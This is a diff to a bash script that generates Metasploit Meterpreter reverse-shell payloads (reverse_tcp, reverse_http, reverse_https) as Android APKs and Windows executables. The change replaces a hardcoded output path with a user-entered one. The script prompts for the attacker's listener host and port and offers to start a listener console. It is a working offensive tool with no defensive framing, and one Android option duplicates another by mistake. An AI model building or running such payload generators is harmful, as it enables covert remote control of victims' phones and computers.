@@ -32,6 +32,8 @@ else
  read lprt
  echo -e "\nenter payload name:"
  read name  
+ echo -e "\nenter path:(ex: /root/Downloads)"
+ read path
  echo -e "\nchoose your payload:"
  echo -e "\n[1]android\n[2]windows\n[3]linux\n[4]exit"
  echo -e "\nenter your choice:"
@@ -46,7 +48,7 @@ else
     while :
        do
         case $z in 1)
-               msfvenom -p android/meterpreter/reverse_tcp lhost=$lhst lport=$lprt -o /users/nireekshanmvs/Downloads/javafiles/$name.apk
+               msfvenom -p android/meterpreter/reverse_tcp lhost=$lhst lport=$lprt -o $path/$name.apk
   #echo "payload sucessfully generated "
                echo -e "\ndo you want to start console:(y/n)" 
                read ans
@@ -58,7 +60,7 @@ else
                fi
         ;;
        2) 
-              msfvenom -p android/meterpreter/reverse_http lhost=$lhst lport=$lprt -o /users/nireekshanmvs/Downloads/javafiles/$name.apk
+              msfvenom -p android/meterpreter/reverse_http lhost=$lhst lport=$lprt -o $path/$name.apk
               echo -e "\ndo you want to start console:(y/n)" 
               read ans
               if [ "$ans" == 'y' ]
@@ -69,7 +71,7 @@ else
               fi
         ;;
        3)
-               msfvenom -p android/meterpreter/reverse_http lhost=$lhst lport=$lprt -o /users/nireekshanmvs/Downloads/javafiles/$name.apk 
+               msfvenom -p android/meterpreter/reverse_http lhost=$lhst lport=$lprt -o $path/$name.apk 
                echo -e "\ndo you want to start console:(y/n)" 
                read ans
                if [ "$ans" == 'y' ]
@@ -95,7 +97,7 @@ else
      do 
        case $z in 1) 
         #echo -e "\n under updates"
-          msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhst lport=$lprt -o /users/nireekshanmvs/Downloads/javafiles/$name.exe
+          msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhst lport=$lprt -o $path/$name.exe
           echo -e "\ndo you want to start console:(y/n)" 
           read ans
           if [ "$ans" == 'y' ]
@@ -106,7 +108,7 @@ else
           fi
        ;;
        2)
-         msfvenom -p windows/meterpreter/reverse_http lhost=$lhst lport=$lprt -o /users/nireekshanmvs/Downloads/javafiles/$name.exe
+         msfvenom -p windows/meterpreter/reverse_http lhost=$lhst lport=$lprt -o $path/$name.exe
          echo -e "\ndo you want to start console:(y/n)" 
          read ans
          if [ "$ans" == 'y' ]
@@ -117,7 +119,7 @@ else
          fi
        ;;  
        3)
-         msfvenom -p windows/meterpreter/reverse_https lhost=$lhst lport=$lprt -o /users/nireekshanmvs/Downloads/javafiles/$name.exe
+         msfvenom -p windows/meterpreter/reverse_https lhost=$lhst lport=$lprt -o $path/$name.exe
          echo -e "\ndo you want to start console:(y/n)" 
          read ans
          if [ "$ans" == 'y' ]
